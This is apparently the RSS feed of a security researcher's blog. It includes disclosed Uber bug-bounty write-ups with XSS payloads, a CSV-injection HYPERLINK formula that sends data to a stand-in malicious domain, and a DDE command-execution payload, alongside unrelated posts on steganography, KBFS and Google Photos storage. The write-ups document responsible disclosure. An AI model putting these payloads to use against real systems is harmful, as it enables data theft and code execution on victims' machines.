<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="assets/xml/rss.xsl" media="all"?><rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/"><channel><title>David Dworken's Blog</title><link>http://blog.daviddworken.com/</link><description>David Dworken's Blog</description><atom:link href="http://blog.daviddworken.com/rss.xml" type="application/rss+xml" rel="self"></atom:link><language>en</language><lastBuildDate>Mon, 18 Apr 2016 00:16:35 GMT</lastBuildDate><generator>http://getnikola.com/</generator><docs>http://blogs.law.harvard.edu/tech/rss</docs><item><title>XSS in pypi (and Uber!)</title><link>http://blog.daviddworken.com/posts/xss-in-pypi-and-uber/</link><dc:creator>David Dworken</dc:creator><description>&lt;div&gt;&lt;p&gt;Uber's bug bounty program just went public, so it is time to write up some of the vulnerabilities I found in Uber. One of the more interesting ones was an XSS in &lt;code&gt;archive.uber.com&lt;/code&gt; due to MIME sniffing. Uber hosts a mirror of pypi (using the same software as pypi) at &lt;code&gt;archive.uber.com/pypi/simple/&lt;/code&gt;. So then the question became, is there a vulnerability here. Pypi doesn't allow package names including any of the characters we would need for a normal XSS (&lt;code&gt;"&lt;/code&gt;, &lt;code&gt;'&lt;/code&gt;, &lt;code&gt;&amp;lt;&lt;/code&gt;, or &lt;code&gt;&amp;gt;&lt;/code&gt;) so we can't get an XSS via the package names. So what about the files?&lt;/p&gt;
&lt;p&gt;When uploading a package to pypi, you simply upload a &lt;code&gt;.tar.gz&lt;/code&gt; of all the requisite files (&lt;code&gt;setup.py&lt;/code&gt;, etc). Pypi does not verify that what we upload is a valid &lt;code&gt;.tar.gz&lt;/code&gt;, instead they simply check the file signature (the first few bytes of the file) to ensure that they are correct. &lt;/p&gt;
&lt;p&gt;When downloading the &lt;code&gt;.tar.gz&lt;/code&gt; from pypi, it is sent with a MIME type of &lt;code&gt;application/octet-stream&lt;/code&gt;. Since &lt;code&gt;application/octet-stream&lt;/code&gt; is a very vague designation, browsers will automatically try to determine the type of the file. Chrome and Firefox both do so by looking the first few bytes of the file (so they will see it as a &lt;code&gt;.tar.gz&lt;/code&gt; and open a download prompt). Internet explorer scans the first 256 bytes of the file for &lt;code&gt;html&lt;/code&gt; and if it finds &lt;code&gt;html&lt;/code&gt; it will interpret the file as HTML. &lt;/p&gt;
&lt;p&gt;So we can combine the fact that the &lt;code&gt;.tar.gz&lt;/code&gt; files are not verified for validity and the vague MIME type to get a persistent XSS. We do so by creating a &lt;code&gt;.tar.gz&lt;/code&gt; that contains &lt;code&gt;&amp;lt;html&amp;gt;&amp;lt;script&amp;gt;alert(0)&amp;lt;/script&amp;gt;&amp;lt;/html&amp;gt;&lt;/code&gt; one can inject javascript into the page. This can be done simply by opening the file in any text editor and adding the text. &lt;/p&gt;
&lt;p&gt;The final step we have to overcome is that the normal method of uploading to pypi doesn't give us a chance to edit the &lt;code&gt;.tar.gz&lt;/code&gt;. So we build it (&lt;code&gt;python setup.py sdist&lt;/code&gt;) and then upload it with Twine (&lt;code&gt;pip install twine&lt;/code&gt; to download it) by running &lt;code&gt;twine upload dist/evil.tar.gz&lt;/code&gt;. &lt;/p&gt;
&lt;p&gt;I uploaded it to pypi and it was then mirrored from pypi to &lt;code&gt;archive.uber.com&lt;/code&gt;. &lt;/p&gt;
&lt;p&gt;I reported this to pypi on March 26th and it was fixed on March 28th. &lt;/p&gt;
&lt;p&gt;I reported this to Uber's bug bounty on March 26th, it was triaged on the 28th, and patched on April 1st. A 750 dollar bounty was awarded on the 6th. You can see the report &lt;a href="https://hackerone.com/reports/126197"&gt;here&lt;/a&gt;. &lt;/p&gt;&lt;/div&gt;</description><guid>http://blog.daviddworken.com/posts/xss-in-pypi-and-uber/</guid><pubDate>Sun, 17 Apr 2016 23:41:05 GMT</pubDate></item><item><title>CSV Injection in business.uber.com</title><link>http://blog.daviddworken.com/posts/csv-injection-in-businessubercom/</link><dc:creator>David Dworken</dc:creator><description>&lt;div&gt;&lt;p&gt;&lt;code&gt;business.uber.com&lt;/code&gt; allows for names to begin with a &lt;code&gt;=&lt;/code&gt; which allows for injection of formulas into the downloaded CSVs. There are two main ways that this can be exploited: &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;It allows for data exfiltration through HYPERLINKs&lt;/li&gt;
&lt;li&gt;It allows for code execution on the user's machine provided that they trust Uber&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;1 can be done by setting one's username to something of the form:  &lt;code&gt;"=HYPERLINK("https://maliciousDomain.com/evil.html?data="&amp;amp;A1, "Click to view additional information")"&lt;/code&gt;. This will create a cell that will show the text "Click to view additional information" but when clicked will send the data in A1 to &lt;code&gt;maliciousDomain.com&lt;/code&gt;. &lt;/p&gt;
&lt;p&gt;2 can be done by setting one's username to something of the form: &lt;code&gt;=cmd|' /C calc'!A0&lt;/code&gt; (this will open Windows calculator). If a CSV contains a command like the above, excel will warn the user with two different pop up boxes. The problem is that these boxes ask the user whether they "trust the source of" the file. Since most users will trust Uber as a source, they will click through both of these warnings without worry. &lt;/p&gt;
&lt;p&gt;&lt;img alt="firstBox" src="http://blog.daviddworken.com/firstBox.png"&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="secondBox" src="http://blog.daviddworken.com/secondBox.png"&gt;&lt;/p&gt;
&lt;p&gt;While it is true that one needs to be an admin on the business page in order to change the username, this still qualifies as a vulnerability (and not simply a self-CSV-injection) since there can be multiple admins. This allows for one admin to get code execution on another admin's computer through the download CSV function. &lt;/p&gt;
&lt;p&gt;Uber patched this by prepending a &lt;code&gt;'&lt;/code&gt; to any names starting with &lt;code&gt;=&lt;/code&gt;, &lt;code&gt;+&lt;/code&gt;, &lt;code&gt;-&lt;/code&gt;. &lt;/p&gt;
&lt;p&gt;I reported this to Uber's bug bounty on March 25th, it was triaged on the 28th, and patched on the 30th. A 1000 dollar bounty was awarded on April 6th. You can see the original report &lt;a href="https://hackerone.com/reports/126109"&gt;here&lt;/a&gt;. &lt;/p&gt;&lt;/div&gt;</description><guid>http://blog.daviddworken.com/posts/csv-injection-in-businessubercom/</guid><pubDate>Sun, 17 Apr 2016 23:30:03 GMT</pubDate></item><item><title>XSS in getrush.uber.com</title><link>http://blog.daviddworken.com/posts/xss-in-getrushubercom/</link><dc:creator>David Dworken</dc:creator><description>&lt;div&gt;&lt;p&gt;The first vulnerability I found for Uber's bug bounty was a reflected XSS in &lt;code&gt;getrush.uber.com&lt;/code&gt;. It was caused by Uber not escaping the &lt;code&gt;utm_campaign&lt;/code&gt;, &lt;code&gt;utm_medium&lt;/code&gt;, and &lt;code&gt;utm_source&lt;/code&gt; parameters at &lt;code&gt;getrush.uber.com/business&lt;/code&gt;. It could be exploited by injecting &lt;code&gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(0)&amp;lt;/script&amp;gt;&lt;/code&gt; into any of those parameters. &lt;/p&gt;
&lt;p&gt;I reported this to Uber on March 22nd, it was triaged the same day, and patched on the 23rd. A 3000 dollar bounty was awarded on April 6th. You can see the original report (including a few markdown errors...) &lt;a href="https://hackerone.com/reports/125112"&gt;here&lt;/a&gt;. &lt;/p&gt;&lt;/div&gt;</description><guid>http://blog.daviddworken.com/posts/xss-in-getrushubercom/</guid><pubDate>Sun, 17 Apr 2016 22:58:50 GMT</pubDate></item><item><title>Simple Image Steganography</title><link>http://blog.daviddworken.com/posts/simple-image-steganography/</link><dc:creator>David Dworken</dc:creator><description>&lt;div&gt;&lt;p&gt;StegIm is a simple program for image steganography. For example, I encoded the phrase &lt;code&gt;Hello world!!!&lt;/code&gt; into &lt;a href="http://blog.daviddworken.com/tree.png"&gt;tree.png&lt;/a&gt; to create &lt;a href="http://blog.daviddworken.com/encodedTree.png"&gt;encodedTree.png&lt;/a&gt;. When looking at the below images it is impossible to tell the difference between them despite additional data being hidden in the second one. &lt;/p&gt;
&lt;p&gt;&lt;img alt="tree.png" src="http://blog.daviddworken.com/tree.png"&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="encodedTree.png" src="http://blog.daviddworken.com/encodedTree.png"&gt;&lt;/p&gt;
&lt;p&gt;Source is available on Github &lt;a href="https://github.com/ddworken/StegIm"&gt;here&lt;/a&gt;. &lt;/p&gt;&lt;/div&gt;</description><guid>http://blog.daviddworken.com/posts/simple-image-steganography/</guid><pubDate>Fri, 04 Mar 2016 21:38:42 GMT</pubDate></item><item><title>Building Signal Desktop In Docker (And Skipping The Line for the Beta!)</title><link>http://blog.daviddworken.com/posts/building-signal-desktop-in-docker/</link><dc:creator>David Dworken</dc:creator><description>&lt;div&gt;&lt;p&gt;Be warned, Signal Desktop is in a closed beta. This program pulls from master and builds Signal Desktop so is in no way guaranteed to work or to be secure. &lt;strong&gt;Use at your own risk.&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;Why? Signal Desktop is in beta and there are over 10,000 people ahead of me in line to join the beta. Open Whisper Systems wants me to invite people in order to jump ahead in line, which I'd rather not do so this is my solution.&lt;/p&gt;
&lt;p&gt;First, make sure you have Docker installed. Then &lt;code&gt;git clone https://github.com/ddworken/signalDesktopDocker.git&lt;/code&gt;. To build Signal Desktop: &lt;code&gt;docker build -t signal .&lt;/code&gt;. &lt;/p&gt;
&lt;p&gt;Currently this Dockerfile is setup to build Signal Desktop then set it up to work with NW but the NW version is stateless (so you have to login every time you use it) so it is recommended to import it as a Chrome extension. To do so, run the container: &lt;code&gt;docker run -ti --rm -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix --cidfile=temp.cid signal&lt;/code&gt;. Then &lt;code&gt;cat temp.cid&lt;/code&gt; to get the ID of the container. Then we need to copy the extension so &lt;code&gt;docker cp [Container ID]:/SignalDesktop.zip ./&lt;/code&gt;. Then unzip SignalDesktop.zip into a folder. Open &lt;code&gt;chrome://extensions&lt;/code&gt; in Chrome and click on "Load unpacked extension..." to load the extension. &lt;/p&gt;
&lt;p&gt;Make sure to re-build the container periodically to keep Signal Desktop up to date. &lt;/p&gt;
&lt;p&gt;I uploaded a copy of Signal Desktop to my KBFS folder &lt;a href="https://keybase.pub/dworken/SignalDesktop.zip"&gt;here&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;To view the Dockerfile, go &lt;a href="https://github.com/ddworken/signalDesktopDocker"&gt;here&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;Credit to Tim Taubert for his &lt;a href="https://timtaubert.de/blog/2016/01/build-your-own-signal-desktop/"&gt;original post&lt;/a&gt; on building Signal Desktop. &lt;/p&gt;&lt;/div&gt;</description><guid>http://blog.daviddworken.com/posts/building-signal-desktop-in-docker/</guid><pubDate>Sat, 27 Feb 2016 04:03:54 GMT</pubDate></item><item><title>Website Hosting with KBFS</title><link>http://blog.daviddworken.com/posts/website-hosting-with-kbfs/</link><dc:creator>David Dworken</dc:creator><description>&lt;div&gt;&lt;p&gt;KBFS is great not only for storing and signing files, but also for hosting a signed mirror of a website. By default keybase.pub is configured to look for a index.html or a index.md. So to mirror your static website in KBFS, just copy it all over into a folder in your public directory. For example, my &lt;a href="https://dworken.keybase.pub/blog/"&gt;blog&lt;/a&gt; and my &lt;a href="https://dworken.keybase.pub/website/index.html"&gt;website&lt;/a&gt; are both mirrored in KBFS. &lt;/p&gt;
&lt;p&gt;To set this up with Nikola (which I use to host my blog), you just need to modify &lt;code&gt;conf.py&lt;/code&gt; to set up the &lt;code&gt;nikola deploy&lt;/code&gt; command. To do so: &lt;/p&gt;
&lt;pre class="code literal-block"&gt;DEPLOY_COMMANDS = {
     'default': [
         "nikola github_deploy",
         "nohup cp -a blog /keybase/public/dworken/ &amp;amp;",
     ]
 }
&lt;/pre&gt;


&lt;p&gt;So now when I run nikola deploy it will automatically deploy to both Github Pages (&lt;a href="https://ddworken.github.io"&gt;ddworken.github.io&lt;/a&gt;) and KBFS (&lt;a href="https://dworken.keybase.pub/blog/index.html"&gt;dworken.keybase.pub/blog&lt;/a&gt;). &lt;/p&gt;&lt;/div&gt;</description><guid>http://blog.daviddworken.com/posts/website-hosting-with-kbfs/</guid><pubDate>Thu, 18 Feb 2016 22:56:33 GMT</pubDate></item><item><title>Slope Field Generator</title><link>http://blog.daviddworken.com/posts/slope-field-generator/</link><dc:creator>David Dworken</dc:creator><description>&lt;div&gt;&lt;p&gt;In my BC Calculus class we were talking about slope fields and Euler's method, so I wanted to program my own slope field generator.&lt;/p&gt;
&lt;p&gt;See github.com/ddworken/SlopeFields/&lt;/p&gt;
&lt;p&gt;&lt;img alt="figure_1" src="https://cloud.githubusercontent.com/assets/5304541/12697204/5f73cdd8-c74b-11e5-9cff-0c7e8f0818c0.png"&gt;
&lt;img alt="figure_2" src="https://cloud.githubusercontent.com/assets/5304541/12697203/5f633db0-c74b-11e5-95fd-1a486c8d801a.png"&gt;
&lt;img alt="figure_3" src="https://cloud.githubusercontent.com/assets/5304541/12697274/672e5154-c74d-11e5-98da-6cfe54eabce3.png"&gt;
&lt;img alt="figure_4" src="https://cloud.githubusercontent.com/assets/5304541/12697949/0c72fd6c-c75e-11e5-81fb-fe990d56c3bc.png"&gt;
&lt;img alt="figure_5" src="https://cloud.githubusercontent.com/assets/5304541/12706974/7736c270-c85b-11e5-830b-7acaf35b4331.png"&gt;
&lt;img alt="figure_9" src="https://cloud.githubusercontent.com/assets/5304541/12723228/8e36fe92-c8d6-11e5-9371-6f6b214c2338.png"&gt;
&lt;img alt="figure_8" src="https://cloud.githubusercontent.com/assets/5304541/12723226/8e347e9c-c8d6-11e5-8c20-6408c164914b.png"&gt;
&lt;img alt="figure_7" src="https://cloud.githubusercontent.com/assets/5304541/12723227/8e34b272-c8d6-11e5-87ff-c39c22260561.png"&gt;
&lt;img alt="figure_6" src="https://cloud.githubusercontent.com/assets/5304541/12723229/8e3b7e72-c8d6-11e5-846e-d5fce1e0b201.png"&gt;&lt;/p&gt;&lt;/div&gt;</description><guid>http://blog.daviddworken.com/posts/slope-field-generator/</guid><pubDate>Wed, 17 Feb 2016 16:17:52 GMT</pubDate></item><item><title>KBFS On Linux</title><link>http://blog.daviddworken.com/posts/kbfs-on-linux/</link><dc:creator>David Dworken</dc:creator><description>&lt;div&gt;&lt;p&gt;By default, the KBFS will only run on linux. This is a short guide on how to setup and install KBFS on Linux (tested on Ubuntu 15.10 with a BTRFS root). Note that this is unsupported (KBFS is still in beta!) and takes a little bit of work to get it to work. &lt;/p&gt;
&lt;p&gt;Start by making sure you have the most recent version of Keybase. Assuming you installed from the &lt;code&gt;.deb&lt;/code&gt;, run &lt;code&gt;sudo apt-get upate&lt;/code&gt; then &lt;code&gt;sudo apt-get install keybase&lt;/code&gt;. &lt;/p&gt;
&lt;p&gt;So now we need to set up the filesystem for KBFS. Start by killing keybase so it doesn't mess with anything as we go: &lt;code&gt;sudo killall keybase&lt;/code&gt;. So now you need to create the &lt;code&gt;/keybase&lt;/code&gt; folder so run &lt;code&gt;sudo mkdir /keybase&lt;/code&gt;. Then we need to change the owner of &lt;code&gt;/keybase&lt;/code&gt; to your user (from root) so that keybase can modify this. So run &lt;code&gt;sudo chown username:username /keybase&lt;/code&gt;. Once that is done you can test it by &lt;code&gt;cd&lt;/code&gt;ing into the directory. &lt;/p&gt;
&lt;p&gt;So now just start the keybase daemon by running &lt;code&gt;run_keybase&lt;/code&gt;. A box will pop up asking you to unlock your device key so KBFS can run. From here you can &lt;code&gt;cd&lt;/code&gt; into &lt;code&gt;/keybase/&lt;/code&gt; to play around. &lt;/p&gt;
&lt;p&gt;Note that &lt;code&gt;ls&lt;/code&gt; and &lt;code&gt;cd&lt;/code&gt; have some weird behavior in this folder. Since it is a FUSE it doesn't follow all the normal specifications. For example, if you &lt;code&gt;cd /keybase/public/&lt;/code&gt; and &lt;code&gt;ls&lt;/code&gt; you will not see a &lt;code&gt;dworken&lt;/code&gt; folder, but if you &lt;code&gt;cd dworken&lt;/code&gt; you will enter my public folder. So when playing around don't expect KBFS to follow your normal expectations on how &lt;code&gt;cd&lt;/code&gt; and &lt;code&gt;ls&lt;/code&gt; work.&lt;/p&gt;
&lt;p&gt;On a sidenote, KeyBase.io's prelease builds are all available &lt;a href="https://s3.amazonaws.com/prerelease.keybase.io/index.html"&gt;here&lt;/a&gt;. In my experience these weren't necessary to get KBFS working, but it is still valuable information. &lt;/p&gt;&lt;/div&gt;</description><guid>http://blog.daviddworken.com/posts/kbfs-on-linux/</guid><pubDate>Tue, 16 Feb 2016 16:16:54 GMT</pubDate></item><item><title>(Ab)using Google’s Unlimited Photo Storage for Fun and Profit</title><link>http://blog.daviddworken.com/posts/abusing-googles-unlimited-photo-storage-for-fun-and-profit/</link><dc:creator>David Dworken</dc:creator><description>&lt;div&gt;&lt;h2&gt;'Unlimited' Storage&lt;/h2&gt;
&lt;p&gt;Google has recently made unlimited free storage available on google photos. At first glance this seems truly amazing (and ripe for abuse). The one caveat to this claim is that all photos uploaded to Google Photos are compressed with lossy compression. This means that any photos uploaded to Google Photos are automatically compressed thereby loosing some detail. &lt;/p&gt;
&lt;p&gt;At first glance, it would appear that this would prevent people from abusing their service since it would make it impossible to upload arbitrary files to their servers since lossy compression would destroy any files uploaded. This also means that many types of steganography would fail if one were to try to store arbitrary data on Google Photos. &lt;/p&gt;
&lt;h2&gt;The Workaround&lt;/h2&gt;
&lt;p&gt;By uploading images of text to Google Photos, we are able to upload arbitrary data. This is because whatever type of lossy image compression Google is using will leave all text in photos intact (as would be expected by the users of Google Photos). &lt;/p&gt;
&lt;p&gt;So this means that in order to store arbitray data on Google Photos, all you have to do is:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Base64 encode a file. &lt;/li&gt;
&lt;li&gt;Create a series of images containing the above text (Google Photos only allows images under 16 megapixels)&lt;/li&gt;
&lt;li&gt;Upload the images&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;And conversely, when retrieving the data from Google Photos, all that has to be done is:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Run image recognition on each photo to get the text.&lt;/li&gt;
&lt;li&gt;Base64 decode the text&lt;/li&gt;
&lt;li&gt;Concatenate the base64 decoded text from each image into one big file&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;The Code&lt;/h2&gt;
&lt;p&gt;I have written a custom python program to implement the above. The code for it is &lt;a href="https://github.com/ddworken/GooglePhotosStorage"&gt;here&lt;/a&gt;. To use it import is as a library and call getImages('fileToBackup') and it will generate the photos for you to upload to Google Photos. To recover the file, download the images from Google Photos into your current dir and call getMessage('fileToBackup'). &lt;/p&gt;
&lt;h2&gt;So What?&lt;/h2&gt;
&lt;p&gt;There are two main uses of this. The first use would be to use this to scheme to upload images to Google Photos thereby preventing Google from running their lossy compression algorithm on your photos. &lt;/p&gt;
&lt;p&gt;The other use of this would be as a true back up service. Since one can upload arbitray files to Google Photos, one can use this as a long term backup solution. One could even write a FUSE filesystem so as to allow for Google Photos to be mounted onto a computer as an external hard drive.&lt;/p&gt;&lt;/div&gt;</description><guid>http://blog.daviddworken.com/posts/abusing-googles-unlimited-photo-storage-for-fun-and-profit/</guid><pubDate>Thu, 06 Aug 2015 16:14:20 GMT</pubDate></item><item><title>Bug Bounties List!</title><link>http://blog.daviddworken.com/posts/bug-bounties-list/</link><dc:creator>David Dworken</dc:creator><description>&lt;div&gt;&lt;h2&gt;The List&lt;/h2&gt;
&lt;p&gt;Over the past 2 months, I've spent some time working on bug bounties. In the past two months, I have found vulnerabilities in the following websites: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;AT&amp;amp;T&lt;/li&gt;
&lt;li&gt;Adobe&lt;/li&gt;
&lt;li&gt;Dyn&lt;/li&gt;
&lt;li&gt;Go Daddy&lt;/li&gt;
&lt;li&gt;Western Union&lt;/li&gt;
&lt;li&gt;Symantec&lt;/li&gt;
&lt;li&gt;IBM&lt;/li&gt;
&lt;li&gt;Vistaprint&lt;/li&gt;
&lt;li&gt;Hobby King&lt;/li&gt;
&lt;li&gt;Tumblr&lt;/li&gt;
&lt;li&gt;Haiku Learning&lt;/li&gt;
&lt;li&gt;Mozilla&lt;/li&gt;
&lt;li&gt;Maret&lt;/li&gt;
&lt;li&gt;eBay&lt;/li&gt;
&lt;li&gt;iFixIt&lt;/li&gt;
&lt;li&gt;MailChimp&lt;/li&gt;
&lt;li&gt;Amazon&lt;/li&gt;
&lt;li&gt;Steam&lt;/li&gt;
&lt;li&gt;Netflix&lt;/li&gt;
&lt;li&gt;Appcelerator&lt;/li&gt;
&lt;li&gt;mail.ru&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So far most of these companies have responded and they have either patched or they are actively working towards patching the vulnerabilities. Once these companies approve public disclosure, I will be adding write ups for each vulnerability to the bottom of this blog post.&lt;/p&gt;&lt;/div&gt;</description><guid>http://blog.daviddworken.com/posts/bug-bounties-list/</guid><pubDate>Sun, 29 Mar 2015 16:13:18 GMT</pubDate></item></channel></rss>